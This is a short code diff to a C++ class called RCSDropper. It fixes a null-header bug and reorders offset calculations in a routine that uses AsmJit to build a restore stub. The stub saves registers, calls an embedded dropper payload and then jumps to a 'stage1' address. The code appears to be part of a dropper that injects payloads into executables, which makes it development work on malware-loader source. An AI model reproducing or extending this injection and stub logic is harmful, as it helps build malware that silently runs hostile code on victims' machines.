@@ -50,7 +50,10 @@ void RCSDropper::patchStage1(char* ptr, DWORD VA, DWORD jumpToVA)
 std::size_t RCSDropper::restoreStub( DWORD currentVA )
 {
 	unsigned char* restore = ptr_ ( offset_.restore );
+
 	DropperHeader* h = header();
+	if (offset_.header == 0) // if header offset is 0, header ptr will be invalid
+		h = NULL;
 
 	DBGTRACE_HEX("Restore  VA : ", currentVA, NOTIFY );
 
@@ -59,7 +62,12 @@ std::size_t RCSDropper::restoreStub( DWORD currentVA )
 
 	DWORD dropperVA = headerVA + sizeof(DropperHeader);
 	DBGTRACE_HEX("Dropper  VA : ", dropperVA, NOTIFY );
-	DBGTRACE_HEX("Stage1   VA : ", h->stage1.VA, NOTIFY);
+
+	DWORD stage1VA = 0;
+	if (h) // if we have a valid header
+		stage1VA = h->stage1.VA;
+
+	DBGTRACE_HEX("Stage1   VA : ", stage1VA, NOTIFY);
 
 	AsmJit::Assembler stub;
 	stub.pushfd();
@@ -68,7 +76,7 @@ std::size_t RCSDropper::restoreStub( DWORD currentVA )
 	stub.call( ( (DWORD)restore ) + (dropperVA - currentVA) );
 	stub.popad();
 	stub.popfd();
-	stub.jmp( ( (DWORD)restore ) + (h->stage1.VA - currentVA) );
+	stub.jmp( ( (DWORD)restore ) + (stage1VA - currentVA) );
 
 	stub.relocCode( (void*) restore );
 
@@ -156,9 +164,10 @@ RCSDropper::RCSDropper(const char* filepath)
 
 	// calculate all offsets
 	offset_.restore = 0;
-	DBGTRACE("Size of restore stub: ", restoreStub(0), NOTIFY);
-	// XXX magic number!
+	offset_.header = 0;
 	offset_.header = std::max<std::size_t>(restoreStub( 0 ), 32);
+	DBGTRACE("Size of restore stub: ", offset_.header, NOTIFY);
+	// XXX magic number!
 	DBGTRACE("Offset to header: ", offset_.header, NOTIFY);
 	offset_.stage1 = offset_.header + fileSize;
 
